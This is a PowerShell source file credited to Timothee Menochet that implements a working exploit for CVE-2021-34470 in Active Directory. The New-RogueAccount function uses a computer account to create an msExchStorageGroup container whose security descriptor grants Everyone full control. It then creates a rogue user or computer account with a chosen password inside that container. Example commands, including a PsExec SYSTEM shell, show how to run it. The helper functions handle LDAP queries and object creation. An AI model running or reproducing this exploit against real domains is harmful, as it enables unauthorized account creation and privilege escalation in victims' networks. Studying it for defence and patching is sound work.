Function New-RogueAccount {
<#
.SYNOPSIS
    Create a new account (user or computer) in Active Directory by exploiting CVE-2021-34470.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-RogueAccount creates a msExchStorageGroup object under the current computer account, and creates a further user or computer object under it.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER Credential
    Specifies the computer account to use.

.PARAMETER Class
    Specifies the account class to create, defaults to 'user'.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> PsExec.exe -i -s powershell.exe
    PS C:\> New-RogueAccount -Class computer -SamAccountName 'testmachine$' -Password P@ssw0rd

.EXAMPLE
    PS C:\> New-RogueAccount -Server ADATUM.CORP -Credential 'ADATUM\testmachine$' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [string]
        $Server = (Get-WMIObject Win32_ComputerSystem | Select -ExpandProperty Domain),

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('user', 'computer')]
        [String]
        $Class = 'user',

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [string]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Password
    )

    Begin {
        try {
            $searchString = "LDAP://$Server/RootDSE"
            $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domainName = $defaultNC -replace 'DC=' -replace ',','.'
        }
        catch {
            Write-Error "Domain controller unreachable" -ErrorAction Stop
        }
    }

    Process {
        $currentId = ((Get-LdapCurrentUser -Server $Server -Credential $Credential).Split('\\'))[1]
        $computer = Get-LdapObject -ADSpath "LDAP://$Server/$defaultNC" -Credential $Credential -Filter "(sAMAccountName=$currentId)" -Properties 'DistinguishedName'
        $containerRDN = "cn=$(-join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_}))"
        $sd = [DirectoryServices.ActiveDirectorySecurity]::new()
        $sd.SetSecurityDescriptorSddlForm("D:P(A;CI;GA;;;WD)", "Access")
        $ba = $sd.GetSecurityDescriptorBinaryForm()
        $newContainer = New-LdapObject -ADSpath "LDAP://$Server/$($computer.DistinguishedName)" -RDN $containerRDN -Class "msExchStorageGroup" -Properties @{nTSecurityDescriptor=$ba} -Credential $Credential
        Write-Host "[+] Container created: $($newContainer.DistinguishedName)"

        $objectRDN = "cn=$SamAccountName"
        $newObject = New-LdapObject -ADSpath "LDAP://$Server/$($newContainer.DistinguishedName)" -RDN $objectRDN -Class $Class -Properties @{sAMAccountName=$SamAccountName; userAccountControl=544} -Credential $Credential
        $newObject.Invoke("SetPassword", $Password)
        $newObject.CommitChanges()
        Write-Host "[+] $Class created: $($newObject.DistinguishedName)"
    }
}

Function Local:Get-LdapCurrentUser {
    [CmdletBinding()]
    Param (
        [string]
        $Server = $Env:USERDNSDOMAIN,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null

        $conn = New-Object DirectoryServices.Protocols.LdapConnection $Server
        if ($Credential.UserName) {
            $conn.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = $conn.SendRequest($extRequest)
        [Text.Encoding]::ASCII.GetString($resp.ResponseValue)
    }
    catch {
        Write-Error $_ -ErrorAction Stop
    }
}

Function Local:Get-LdapObject {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ADSpath,

        [ValidateNotNullOrEmpty()]
        [string]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [string]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    if ($Credential.UserName) {
        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
    }
    else {
        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
    }
    $searcher.SearchScope = $SearchScope
    $searcher.PageSize = $PageSize
    $searcher.CacheResults = $false
    $searcher.filter = $Filter
    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
    try {
        $results = $searcher.FindAll()
        $results | Where-Object {$_} | ForEach-Object {
            $objectProperties = @{}
            $p = $_.Properties
            $p.PropertyNames | ForEach-Object {
                if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
        $results.dispose()
        $searcher.dispose()
    }
    catch {
        Write-Error $_ -ErrorAction Stop
    }
}

Function Local:New-LdapObject {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ADSpath,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $RDN,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Class,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ($Credential.UserName) {
            $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        }
        else {
            $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($ADSpath)
        }
    }

    Process {
        Write-Verbose "Attempting to create object $RDN"
        $newObject = $containerObject.Children.Add($RDN, $Class)
        if ($Properties) {
            foreach ($property in $Properties.GetEnumerator()) {
                $newObject.Properties[$property.Key].Value = $property.Value
            }
        }
        try {
            $newObject.CommitChanges()
            Write-Verbose "Object created: $($newObject.DistinguishedName)"
        }
        catch {
            Write-Error $_
        }
        return $newObject
    }
}
